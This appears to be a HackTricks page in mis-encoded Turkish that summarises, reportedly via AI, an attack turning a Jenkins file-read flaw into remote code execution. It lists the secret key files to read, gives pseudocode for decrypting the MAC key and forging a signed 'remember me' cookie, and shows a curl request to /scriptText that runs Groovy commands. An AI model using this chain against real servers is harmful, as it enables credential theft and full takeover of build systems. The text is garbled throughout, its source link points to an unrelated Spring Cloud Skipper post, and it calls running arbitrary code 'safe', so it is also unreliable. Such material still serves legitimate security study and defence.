# Jenkins Arbitrary File Read to RCE via "Remember Me"

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

Bu blog yazÄ±sÄ±nda, Jenkins'teki bir Yerel Dosya Dahil Etme aÃ§Ä±ÄŸÄ±nÄ± RCE'ye dÃ¶nÃ¼ÅŸtÃ¼rmenin harika bir yolunu bulabilirsiniz: [https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/](https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/)

Bu, bir yerel dosya okuma aÃ§Ä±ÄŸÄ±nÄ± kullanarak RCE elde etmek iÃ§in bir keyfiyet Ã§erezi oluÅŸturmanÄ±n kÃ¶tÃ¼ye kullanÄ±ldÄ±ÄŸÄ± yazÄ±nÄ±n bir kÄ±smÄ±nÄ±n AI tarafÄ±ndan oluÅŸturulmuÅŸ Ã¶zetidir:

### SaldÄ±rÄ± Ã–n KoÅŸullarÄ±

* **Ã–zellik Gereksinimi:** "Beni hatÄ±rla" etkin olmalÄ±dÄ±r (varsayÄ±lan ayar).
* **EriÅŸim DÃ¼zeyleri:** SaldÄ±rganÄ±n Genel/Okuma izinlerine ihtiyacÄ± vardÄ±r.
* **Gizli EriÅŸim:** Anahtar dosyalardan hem ikili hem de metin iÃ§eriÄŸini okuma yeteneÄŸi.

### AyrÄ±ntÄ±lÄ± SÃ¶mÃ¼rÃ¼ SÃ¼reci

#### AdÄ±m 1: Veri Toplama

**KullanÄ±cÄ± Bilgisi Alma**

* Her kullanÄ±cÄ± iÃ§in `$JENKINS_HOME/users/*.xml` dosyasÄ±ndan kullanÄ±cÄ± yapÄ±landÄ±rmasÄ± ve gizli bilgileri eriÅŸin:
* **KullanÄ±cÄ± AdÄ±**
* **KullanÄ±cÄ± tohum**
* **Zaman damgasÄ±**
* **Åifre karmasÄ±**

**Gizli Anahtar Ã‡Ä±kartma**

* Ã‡erezi imzalamak iÃ§in kullanÄ±lan kriptografik anahtarlarÄ± Ã§Ä±kartÄ±n:
* **Gizli Anahtar:** `$JENKINS_HOME/secret.key`
* **Anahtar:** `$JENKINS_HOME/secrets/master.key`
* **MAC Anahtar DosyasÄ±:** `$JENKINS_HOME/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac`

#### AdÄ±m 2: Ã‡erez SahteciliÄŸi

**Token HazÄ±rlÄ±ÄŸÄ±**

*   **Token SÃ¼re Sonunu Hesapla:**

{% code overflow="wrap" %}
```javascript
tokenExpiryTime = currentServerTimeInMillis() + 3600000  // Mevcut zamana bir saat ekler
```
{% endcode %}
*   **Token iÃ§in Verileri BirleÅŸtir:**

{% code overflow="wrap" %}
```javascript
token = username + ":" + tokenExpiryTime + ":" + userSeed + ":" + secretKey
```
{% endcode %}

**MAC AnahtarÄ±nÄ±n Åifre Ã‡Ã¶zÃ¼mÃ¼**

*   **MAC Anahtar DosyasÄ±nÄ± Åifre Ã‡Ã¶z:**

```javascript
key = toAes128Key(masterKey)  // AnahtarÄ± AES128 anahtar formatÄ±na dÃ¶nÃ¼ÅŸtÃ¼r
decrypted = AES.decrypt(macFile, key)  // .mac dosyasÄ±nÄ± ÅŸifre Ã§Ã¶z
if not decrypted.hasSuffix("::::MAGIC::::")
return ERROR;
macKey = decrypted.withoutSuffix("::::MAGIC::::")
```

**Ä°mza Hesaplama**

*   **HMAC SHA256 Hesapla:**

```javascript
mac = HmacSHA256(token, macKey)  // Token ve MAC anahtarÄ±nÄ± kullanarak HMAC hesapla
tokenSignature = bytesToHexString(mac)  // MAC'i onaltÄ±lÄ±k dizeye dÃ¶nÃ¼ÅŸtÃ¼r
```

**Ã‡erez Kodlama**

*   **Son Ã‡erezi OluÅŸtur:**

{% code overflow="wrap" %}
```javascript
cookie = base64.encode(username + ":" + tokenExpiryTime + ":" + tokenSignature)  // Ã‡erez verilerini Base64 ile kodla
```
{% endcode %}

#### AdÄ±m 3: Kod Ã‡alÄ±ÅŸtÄ±rma

**Oturum Kimlik DoÄŸrulama**

* **CSRF ve Oturum Token'larÄ±nÄ± Al:**
* `Jenkins-Crumb` almak iÃ§in `/crumbIssuer/api/json` adresine bir istek yapÄ±n.
* YanÄ±ttan `JSESSIONID`'yi yakalayÄ±n, bu `remember-me` Ã§erezi ile birlikte kullanÄ±lacaktÄ±r.

**Komut Ã‡alÄ±ÅŸtÄ±rma Ä°steÄŸi**

*   **Groovy Script ile POST Ä°steÄŸi GÃ¶nder:**

```bash
curl -X POST "$JENKINS_URL/scriptText" \
--cookie "remember-me=$REMEMBER_ME_COOKIE; JSESSIONID...=$JSESSIONID" \
--header "Jenkins-Crumb: $CRUMB" \
--header "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "script=$SCRIPT"
```

* Groovy script, sistem dÃ¼zeyinde komutlarÄ± veya Jenkins ortamÄ±nda diÄŸer iÅŸlemleri Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±labilir.

Verilen Ã¶rnek curl komutu, gerekli baÅŸlÄ±klar ve Ã§erezlerle Jenkins'e istek yaparak keyfi kodu gÃ¼venli bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rmanÄ±n nasÄ±l yapÄ±lacaÄŸÄ±nÄ± gÃ¶stermektedir.

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
